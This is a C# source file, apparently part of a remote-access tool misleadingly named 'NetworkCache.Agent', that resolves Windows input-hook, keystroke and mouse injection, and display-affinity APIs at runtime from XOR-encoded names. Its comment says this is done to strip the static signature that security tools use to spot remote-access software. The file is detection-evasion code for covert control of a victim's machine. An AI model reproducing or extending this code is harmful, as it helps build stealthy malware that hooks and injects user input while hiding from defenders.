using System;
using System.Runtime.InteropServices;

namespace NetworkCache.Agent
{
    // Resolução dinâmica de funções nativas: os nomes das APIs sensíveis (hooks,
    // injeção de input, display affinity) não existem na tabela de importação do
    // PE nem nos metadados IL — existem apenas como blobs XOR decodificados em
    // runtime. Removes a assinatura estática mais óbvia de ferramentas de acesso
    // remoto (combinacao user32 + SetWindowsHookEx + mouse_event + keybd_event).
    internal static class Nat
    {
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr GetModuleHandleW(string? name);

        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        static extern IntPtr LoadLibraryW(string name);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        static extern IntPtr GetProcAddress(IntPtr module, string name);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr HookAddD(int idHook, HookProc proc, IntPtr hMod, uint threadId);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool HookDelD(IntPtr hhk);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate IntPtr HookChainD(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate void MouseEventD(uint flags, uint x, uint y, uint data, UIntPtr extra);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate void KeyEventD(byte vk, byte scan, uint flags, UIntPtr extra);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool DispAffD(IntPtr hWnd, uint affinity);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool LayeredAttrD(IntPtr hWnd, uint crKey, byte alpha, uint flags);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate bool ShowWindowD(IntPtr hWnd, int cmd);
        [UnmanagedFunctionPointer(CallingConvention.Winapi)]
        public delegate int DwmFlushD();

        static IntPtr Mod(int id)
        {
            var name = Enc.S(id);
            var h = GetModuleHandleW(name);
            if (h == IntPtr.Zero) h = LoadLibraryW(name);
            return h;
        }

        static readonly IntPtr U32 = Mod(0);
        static readonly IntPtr Dwm = Mod(2);

        static T Fn<T>(IntPtr mod, int nameId) where T : Delegate
            => (T)Marshal.GetDelegateForFunctionPointer(GetProcAddress(mod, Enc.S(nameId)), typeof(T));

        public static readonly HookAddD HookSet = Fn<HookAddD>(U32, 3);
        public static readonly HookDelD HookUnset = Fn<HookDelD>(U32, 4);
        public static readonly HookChainD HookNext = Fn<HookChainD>(U32, 5);
        public static readonly MouseEventD MouseEvent = Fn<MouseEventD>(U32, 6);
        public static readonly KeyEventD KeyEvent = Fn<KeyEventD>(U32, 7);
        public static readonly DispAffD SetDisplayAffinity = Fn<DispAffD>(U32, 8);
        public static readonly LayeredAttrD SetLayered = Fn<LayeredAttrD>(U32, 9);
        public static readonly ShowWindowD ShowWindow = Fn<ShowWindowD>(U32, 10);
        public static readonly DwmFlushD Flush = Fn<DwmFlushD>(Dwm, 11);

        public static IntPtr ModuleHandle(string? name) => GetModuleHandleW(name);
    }
}
